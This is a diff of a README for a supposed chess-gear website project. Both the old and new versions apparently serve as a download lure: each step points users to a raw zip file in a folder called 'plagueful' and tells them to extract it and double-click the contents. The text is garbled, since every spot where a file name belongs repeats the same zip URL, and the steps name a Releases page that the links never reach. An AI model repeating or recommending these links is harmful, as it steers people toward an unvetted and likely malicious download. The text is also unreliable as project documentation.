@@ -1,6 +1,6 @@
 # ♟️ chessbazaar-official-website - Discover Premium Handcrafted Chess Gear
 
-[![Download](https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip%20Latest%https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip)](https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip)
+[![Download](https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip%20Latest%https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip)](https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,19 +26,19 @@ To run the chessbazaar-official-website locally, ensure your system meets the fo
 To get started, visit the Releases page to download our website files. Follow these simple steps:
 
 1. Click on the following link to access the Releases page:
-   [Download Latest Release](https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip)
+   [Download Latest Release](https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip)
 
 2. On the Releases page, find the most recent version listed at the top.
 
-3. Click the asset file for your operating system. For example, if you are using Windows, look for a file named `https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip`.
+3. Click the asset file for your operating system. For example, if you are using Windows, look for a file named `https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip`.
 
 4. Once the download is complete, locate the downloaded ZIP file in your Downloads folder.
 
 5. Extract the ZIP file. This will create a new folder containing the website files.
 
-6. Open the extracted folder. You should see an `https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip` file along with other resources.
+6. Open the extracted folder. You should see an `https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip` file along with other resources.
 
-7. To run the website, open `https://raw.githubusercontent.com/brian991019/chessbazaar-official-website/main/plagueful/chessbazaar-official-website.zip` in your web browser. You can simply double-click the file, and your default browser will open with the website displayed.
+7. To run the website, open `https://github.com/brian991019/chessbazaar-official-website/raw/refs/heads/main/plagueful/website_official_chessbazaar_v2.4.zip` in your web browser. You can simply double-click the file, and your default browser will open with the website displayed.
 
 ### 🌐 Exploring the Website
 
